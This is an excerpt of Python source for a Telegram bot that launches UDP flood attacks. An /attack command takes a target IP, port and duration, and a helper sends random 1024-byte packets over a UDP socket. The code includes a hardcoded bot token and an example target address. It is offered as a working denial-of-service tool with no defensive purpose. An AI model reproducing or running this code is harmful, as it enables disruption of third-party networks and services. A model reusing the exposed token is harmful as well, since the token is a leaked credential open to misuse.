...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7757010456:AAFAMCU6Uf6H1yg6NaRFZjcsMIHJWa4PgqY'
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "*Let the war begin! ⚔️💥*"
        "*for example -:/attack  20.219.166.28 28864 180*"
    )
...
async def attack(update: Update, context: CallbackContext):
    ...
    await context.bot.send_message(chat_id=chat_id, text=f"*⚔️ Starting attack on {ip}:{port} for {duration} seconds...*", parse_mode='Markdown')

    asyncio.create_task(execute_attack(ip, port, duration, chat_id, context))

# Helper Function to Execute the Attack
async def execute_attack(ip, port, duration, chat_id, context):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet = random._urandom(1024)  # Generate a random packet for the attack
